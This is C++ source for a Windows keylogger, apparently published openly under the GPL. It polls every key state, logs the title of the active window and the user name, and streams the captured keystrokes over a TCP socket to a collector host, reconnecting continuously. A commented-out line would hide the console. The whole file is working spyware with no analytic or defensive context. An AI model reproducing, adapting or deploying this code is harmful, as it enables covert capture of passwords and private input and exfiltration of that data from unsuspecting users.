
/*
	Keylogger
	Created @ 02.02.2009
	Copyright (C) 2009 Christian Mayer <http://fox21.at>
	
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#pragma comment(lib, "ws2_32.lib")
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <windows.h>

#include <sstream>
#include <iostream>

SOCKET soc = INVALID_SOCKET;

int main(int argc, char **argv)
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true)
	{
		if (soc != INVALID_SOCKET)
		{
			closesocket(soc);
			soc = INVALID_SOCKET;
		}

		Sleep(250);
		WSAData data;
		WSAStartup(MAKEWORD(2, 2), &data);

		struct addrinfo *result = NULL, hints;

		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		getaddrinfo("127.0.0.1", "21589", &hints, &result);

		soc = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

		while (connect(soc, result->ai_addr, result->ai_addrlen) == SOCKET_ERROR);

		char *buffer = new char[1024]();
		DWORD size = 1024;
		GetUserName(buffer, &size);

		std::string user_name(buffer, size);

		if (send(soc, user_name.c_str(), user_name.size(), 0) == SOCKET_ERROR)
		{
			delete[] buffer;
			closesocket(soc);
			continue;
		}

		std::string lastTitle = "";
		std::stringstream stream;
		Sleep(5000);
		//SHORT lastc = 0;
		while (true) 
		{
			// get the active windowtitle
			char title[2048];
			HWND hwndHandle = GetForegroundWindow();
			GetWindowText(hwndHandle, title, 2048);
			if (lastTitle != title) 
			{
				stream << std::endl << std::endl << "Window: ";
				strlen(title) == 0 ? stream << "NO ACTIVE WINDOW" : stream << "'" << title << "'" << std::endl;
				lastTitle = title;
			}

			// logging keys, thats the keylogger
			for (unsigned char c = 1; c < 255; c++) 
			{
				SHORT rv = GetAsyncKeyState(c);
				if (rv & 1) // on press button down
					stream << (int)c << " ";
			}

			std::string data = stream.str();
			if (data.size() > 0)
			{
				std::cout << data;
				if (send(soc, data.c_str(), data.size(), 0) == SOCKET_ERROR)
				{
					break;
				}
				stream.str(std::string());
			}
		}
	}
}
